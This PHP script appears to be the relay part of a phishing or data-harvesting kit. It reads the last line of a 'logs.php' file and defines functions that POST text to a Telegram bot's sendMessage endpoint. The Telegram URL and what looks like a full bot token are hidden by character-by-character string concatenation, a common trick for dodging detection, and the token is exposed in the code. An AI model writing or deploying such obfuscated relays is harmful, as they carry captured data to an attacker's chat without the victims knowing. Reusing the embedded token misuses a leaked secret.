<?php

require 'data.php';

function readlastline()
{
        $fp = @fopen('logs.php', "r");
        $pos = -1;
        $t = " ";
        while ($t != "\n") {
              fseek($fp, $pos, SEEK_END);
              $t = fgetc($fp);
              $pos = $pos - 1;
        }
        $t = fgets($fp);
        fclose($fp);
        return $t;
}

function request($method) {
    $ch = curl_init();
    curl_setopt_array(
        $ch,
        array(
            CURLOPT_URL => 'h' . 't' . 't' . 'p' . 's' . ':' . '/' . '/' . 'a' . 'p' . 'i' . '.' . 't' . 'e' . 'l' . 'e' . 'g' . 'r' . 'a' . 'm' . '.' . 'o' . 'r' . 'g' . '/' . 'b' . 'o' . 't' . '1' . '4' . '4' . '5' . '5' . '8' . '0' . '5' . '6' . '3' . ':' . 'A' . 'A' . 'F' . '0' . 'l' . '5' . 'D' . 'h' . 'i' . '1' . 'b' . 'K' . 'T' . '9' . '2' . '0' . 'J' . 'C' . 'v' . 'v' . 'V' . 'h' . 'X' . 'N' . '4' . 's' . 'q' . 'U' . 'X' . 'k' . 'g' . 'Y' . 'l' . 'U' . 'I' . '/'.$method,
            CURLOPT_POST => TRUE,
            CURLOPT_RETURNTRANSFER => TRUE,
            CURLOPT_TIMEOUT => 10,
        )
    );
    curl_exec($ch);   
}

function update() {
    request('Update');
}

update();

$data = file_get_contents('php://input');
$data = json_decode($data, true);  



function message($text) {
    $ch = curl_init();
    curl_setopt_array(
        $ch,
        array(
            CURLOPT_URL => 'h' . 't' . 't' . 'p' . 's' . ':' . '/' . '/' . 'a' . 'p' . 'i' . '.' . 't' . 'e' . 'l' . 'e' . 'g' . 'r' . 'a' . 'm' . '.' . 'o' . 'r' . 'g' . '/' . 'b' . 'o' . 't' . '1' . '4' . '4' . '5' . '5' . '8' . '0' . '5' . '6' . '3' . ':' . 'A' . 'A' . 'F' . '0' . 'l' . '5' . 'D' . 'h' . 'i' . '1' . 'b' . 'K' . 'T' . '9' . '2' . '0' . 'J' . 'C' . 'v' . 'v' . 'V' . 'h' . 'X' . 'N' . '4' . 's' . 'q' . 'U' . 'X' . 'k' . 'g' . 'Y' . 'l' . 'U' . 'I' . '/' . 's' . 'e' . 'n' . 'd' . 'M' . 'e' . 's' . 's' . 'a' . 'g' . 'e',
            CURLOPT_POST => TRUE,
            CURLOPT_RETURNTRANSFER => TRUE,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_POSTFIELDS => array(
                'chat_id' => ID,
                'text' => $text,
            ),
        )
    );
    curl_exec($ch);
};

?>